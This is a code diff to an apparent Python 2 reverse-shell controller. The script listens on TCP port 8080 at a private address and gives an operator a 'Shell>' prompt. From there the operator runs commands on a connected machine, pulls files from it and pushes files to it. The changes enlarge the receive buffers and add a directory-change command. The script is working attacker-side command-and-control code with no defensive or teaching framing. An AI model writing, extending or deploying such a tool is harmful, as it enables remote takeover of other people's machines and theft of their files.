@@ -21,7 +21,7 @@ def transfer(conn,command):
     conn.send(command)
     f = open('/root/Desktop/test.png','wb')
     while True:
-        bits = conn.recv(1024)
+        bits = conn.recv(2048)
         if 'Unable to find out the file' in bits:
             print '[-] Unable to find out the file'
             break
@@ -34,20 +34,25 @@ def transfer(conn,command):
 def send(s, path, command):
     if os.path.exists(path):
         f = open(path, 'rb')
-        packet = f.read(1024)
+        packet = f.read(2048)
         while packet != '':
             s.send(packet)
-            packet = f.read(1024)
+            packet = f.read(2048)
         s.send('DONE')
         print('[+] File Sent!')
         f.close()
     else:
         print('File does not exist')
 
+def changeDirectory(conn, command):
+    conn.send(command)
+    newDirectory = conn.recv(2048)
+    print(newDirectory)
+
 
 def connect():
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.bind(("192.168.71.130", 8080))                #CHANGE IP ADDRESS AND PORT
+    s.bind(("192.168.71.130", 8080))
     s.listen(1)
     print '[+] Listening for incoming TCP connection on port 8080'
     conn, addr = s.accept()
@@ -57,6 +62,7 @@ def connect():
 
     while True:
         command = raw_input("Shell> ")
+
         if 'terminate' in command:
             conn.send('terminate')
             conn.close()
@@ -81,9 +87,13 @@ def connect():
                 s.send (str(e))
                 pass
 
+        elif 'cd' in command:
+            changeDirectory(conn,command)
+
+
         else:
             conn.send(command)
-            print conn.recv(1024)
+            print conn.recv(2048)
 
 def main ():
     connect()
